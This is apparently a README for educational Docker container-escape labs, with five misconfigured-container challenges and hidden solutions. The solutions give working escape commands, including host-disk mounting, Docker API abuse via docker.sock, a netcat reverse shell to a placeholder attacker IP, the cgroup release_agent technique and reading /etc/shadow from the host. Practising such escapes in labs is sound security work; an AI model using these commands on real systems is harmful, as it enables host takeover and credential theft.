# docker-escape-labs
Docker labs to practice container escape, for educational purpose only.

## chall01 - privileged

```
docker build -t ctf-privileged .
docker run --rm -it --privileged ctf-privileged
```

<details>
  <summary>Solution</summary>

  1. Retrieve the host disk
  ```
  fdisk -l
  ```
  2. Create a new folder
  ```
  mkdir /mnt/host
  ```
  3. Mount the host disk into the new folder (because of `--privileged`)
  ```
  mount /dev/sda1 /mnt/host
  ```
  4. Change the chroot to the new folder
  ```
  chroot /mnt/host /bin/bash
  ```
</details>

## chall02 - docker.sock

```
docker build -t ctf-socket .
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ctf-socket
```

<details>
  <summary>Solution1</summary>

  1. Access to `docker.sock` allows you to create new containers with full access to the host
  ```
  docker run -v /:/host -it --rm ubuntu chroot /host /bin/bash
  ```
</details>

<details>
  <summary>Solution2</summary>
  
  You can do the same using the Docker api, with `curl`
  1. Create the container
  ```
  curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["chroot", "/host"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true, "PidMode": "host"}, "Tty": true, "OpenStdin": true}' http://localhost/v1.41/containers/create?name=escape_container
  ```
  You may need to pull the image if it does not exist!
  ```
  curl --unix-socket /var/run/docker.sock -X POST "http://localhost/v1.41/images/create?fromImage=alpine&tag=latest"
  ```
  2. Launch the container
  ```
  curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
  ```
  3. Get a shell
  ```
  docker exec -it escape_container sh
  ```
  You can do the same to get a reverse shell
  ```
  # Create the container
  curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["sh", "-c", "chroot /host nc <IP_ATTAQUANT> <PORT> -e /bin/sh"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true, "PidMode": "host"}, "Tty": true, "OpenStdin": true}' http://localhost/v1.41/containers/create?name=escape_container

  # Start the container
  curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
  ```
</details>

## chall03 - CAP_SYS_ADMIN

```
docker build -t ctf-sysadmin .
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ctf-sysadmin
```

<details>
  <summary>Solution</summary>

  1. Exploit `release_agent` via `cgroup v1`
  ```
  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
  mkdir /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
  echo "$host_path/cmd" > /tmp/cgrp/release_agent
  cat > /cmd <<'EOF'
  #!/bin/sh
  ps aux > /output   # ou reverse shell
  EOF
  chmod +x /cmd
  echo $$ > /tmp/cgrp/x/cgroup.procs
  ```
</details>

## chall04 - CAP_DAC_READ_SEARCH

```
docker build -t ctf-dac .
docker run --rm -it --cap-add=DAC_READ_SEARCH ctf-dac
```

<details>
  <summary>Solution</summary>

  1. Use shoker exploit that uses `open_by_handle_at()` and run it
  ```
  gcc shocker.c -o shocker
  ```
</details>

## chall05 - --pid=host

```
docker build -t ctf-pidhost .
docker run --rm -it --pid=host ctf-pidhost
```

<details>
  <summary>Solution</summary>

  1. Use shoker exploit that uses `open_by_handle_at()` and run it
  ```
  ps aux                      # check all processes on host
  ls -la /proc/1/root/        # access FS of a process
  cat /proc/1/root/etc/shadow 2>/dev/null
  ```
</details>
